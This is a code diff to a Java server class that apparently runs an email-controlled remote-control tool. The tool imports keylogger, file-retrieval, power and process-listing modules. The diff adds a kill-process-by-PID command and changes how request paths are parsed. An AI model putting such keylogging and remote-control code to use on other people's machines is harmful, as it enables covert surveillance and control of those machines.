@@ -2,6 +2,7 @@ package com.example.project.server;
 
 import com.example.project.features.getfile.GetFile;
 import com.example.project.features.keylogger.KeyLog;
+import com.example.project.features.list.KillPrc;
 import com.example.project.features.list.ListApp;
 import com.example.project.features.list.ListPrc;
 import com.example.project.features.power.SRS;
@@ -125,7 +126,7 @@ public class sendResponse extends Thread{
 
                     }
                     else {
-                        String path = Server.reqList.get(index).substring(2).strip();
+                        String path = Server.reqList.get(index).split(" ",-1)[1].strip();
                         File file = new File(path);
                         if (file.isDirectory()){
                             text = gf.listFile(file.getAbsolutePath());
@@ -187,6 +188,20 @@ public class sendResponse extends Thread{
                     }
                     sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
                     sm.send(appList);
+                    break;
+                }
+                case "11":{
+                    KillPrc kc = new KillPrc();
+                    String pid = Server.reqList.get(index).split(" ",-1)[1].strip();
+                    kc.run(pid);
+                    if (kc.isSuccess()){
+                        sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
+                        sm.sendContent("Kill Successful");
+                    }
+                    else {
+                        sendMail sm = new sendMail(getMail(Server.mailList.get(index)),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.get(index));
+                        sm.sendContent("Kill Unsuccessful");
+                    }
                     break;
                 }
                 default: {
